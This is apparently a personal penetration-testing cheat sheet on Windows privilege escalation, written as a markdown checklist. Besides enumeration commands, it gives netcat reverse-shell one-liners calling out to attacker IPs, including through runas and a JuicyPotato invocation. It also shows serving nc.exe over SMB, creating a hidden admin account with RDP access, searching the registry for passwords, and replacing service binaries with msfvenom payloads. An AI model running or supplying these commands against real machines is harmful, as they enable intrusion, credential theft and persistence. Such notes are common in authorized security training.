# Windows Privilege Escallation
- [ ] OS and Kernel information: `systeminfo`
- [ ] Current User: `whoami /all`
  - [ ] [NT AUTHORITY\LOCAL SERVICE](https://itm4n.github.io/localservice-privileges/?ref=benheater.com); This will enable `SeImpersonatePrivilege`.
- [ ] Local Users: `net users`
- [ ] Local Groups: `net localgroup`
- [ ] Network interfaces: `ipconfig`
- [ ] Open Ports: `netstat -ano`
- [ ] `whoami /priv` ->
  - [ ] `SeImpersonatePrivilege`
    - [ ] [PrintSpoofer](https://github.com/itm4n/PrintSpoofer): SeImpersonatePrivilege + Microsoft Windows Server 2019 Standard = PrintSpoofer64.exe
  - [ ] `AlwaysInstallElevated`
  - [ ] `SeDebugPrivilege`
- [ ] Check installed softwares: `c:\Program Files (x86)`
- [ ] `winpeas.exe cmd`
```
#https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- [ ] Check file permissions: `icacls "\path\to\file"`
- [ ] If you find credentials, then you can use `runas` method to make connection with netcat
```
runas /user:administrator "C:\users\viewer\desktop\nc.exe -e cmd.exe 192.168.49.57 443"
```
- [ ] Check Unqouted Path Service
```
#FIND SERVICE
wmic service get name,displayname,pathname,startmode |findstr /i "auto"

#CHANGE FILE WITH MSFVENOM PAYLOAD (DOWNLOAD WITH CERTUTIL)

#REBOOT
shutdown /r
```
- [ ] Look for passwords in registries
```
req query HKLM /f pass /t REG_SZ /s
```

---

# SeImpersonatePrivilege
- [GodPotato](https://github.com/BeichenDream/GodPotato)

---

- Check if there is a port that is open only internally (`netstat –nao`)
- Port forward if there is a new port internally and start checking it from zero
- Creating admin user which has RDP access

```
net user /add haji haji
net localgroup administrators haji /add
net localgroup "Remote Desktop Users" haji /add
```

# Shell Upgrade
```
#COPY NETCAT
cp /usr/share/windows-resources/binaries/nc.exe .

#SERVE IT VIA SMB
smbserver.py -smb2support -username evil -password evil evil $PWD

#START LISTENER ON ANOTHER PORT
nc -lnvp 80

#Execute nc.exe by using the UNC path.
net use z: \\192.168.49.57\evil /user:evil evil
Z:\nc.exe 192.168.49.57 80 -e cmd.exe
```

# Juicy Potato
We can use one of the BITS CSLIDs from here:
https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise
```
juicy.potato.x86.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\wamp\www\nc.exe -e cmd.exe 192.168.49.85 443" -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

## Binary Hijacking


## DLL Hijacking


---

```
My first commands I use when getting a Windows shell are below. Enumerate OS etc, check for JuicyPotato, common password locations and running netstat.

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" 
whoami /priv
netstat –nao
dir C:\Windows\System32\config\RegBack\SAM
dir C:\Windows\System32\config\RegBack\SYSTEM
```
